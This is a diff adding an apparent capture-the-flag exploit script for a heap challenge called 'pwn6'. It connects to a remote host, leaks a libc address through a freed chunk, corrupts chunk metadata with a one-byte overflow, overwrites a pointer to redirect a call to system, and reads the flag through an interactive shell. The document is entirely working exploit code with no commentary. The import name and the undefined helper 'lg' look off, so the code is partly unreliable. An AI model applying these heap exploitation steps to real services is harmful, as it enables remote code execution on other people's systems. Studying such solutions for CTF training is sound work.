@@ -1,0 +1,69 @@
+#!/usr/bin/python
+#coding=utf-8
+from Pwnpayloadtext import *
+from IPython import embed as ipy
+
+context.terminal = ['gnome-terminal','-x','sh','-c']
+context.log_level = 'debug'
+
+s      = lambda data               :p.send(data) 
+sa      = lambda delim,data         :p.sendafter(delim, data)
+sl      = lambda data               :p.sendline(data)
+sla     = lambda delim,data         :p.sendlineafter(delim, data)
+r      = lambda numb=4096          :p.recv(numb)
+rl      = lambda                    :p.recvline()
+ru      = lambda delims,drop=False  :p.recvuntil(delims,drop)
+uu32    = lambda data               :u32(data.ljust(4, '\x00'))
+uu64    = lambda data               :u64(data.ljust(8, '\x00'))
+info    = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
+irt     = lambda                    :p.interactive()
+
+context.binary = './pwn6'
+elf = ELF('./pwn6')
+p = remote('219.219.61.234','10005')
+libc = elf.libc
+def add(idx,size,payload):
+    sla('>>','1')
+    sla('>>',str(idx))
+    sla('>>',str(size))
+    sla('>>',payload)
+
+def edit(idx,payload):
+    sla('>>','3')
+    sla('>>',str(idx))
+    p.sendafter('>>',payload)
+
+def delete(idx):
+    sla('>>','2')
+    sla('>>',str(idx))
+
+def show(idx):
+    sla('>>','5')
+    sla('>>',str(idx))
+
+sla("important secret","aaaa")
+sla(">>","2")
+
+add(0,0x80,"a")
+add(1,0x80,"b")
+delete(0)
+show(0)
+libc_base = uu64(ru('\x7f'))-88-0x10-libc.sym['__malloc_hook']
+lg(libc_base)
+system = libc_base + libc.sym["system"]
+lg(system)
+add(2,0x88,"c")
+add(3,0x88,"d")
+add(4,0x88,"e")
+# gdb.attach(p)
+edit(0,'a'*0x88 + '\xd1')
+delete(1)
+add(5,0xc8,"f")
+payload = p64(0)*3+p64(0x21)+p64(0)*16
+payload += p64(0)+p64(0x21)+p64(0x88)+p64(0x602080)+p64(0)
+edit(5,payload)
+sl("ls")
+edit(3,p64(system))
+sl("ls")
+sl("cat flag")
+irt()
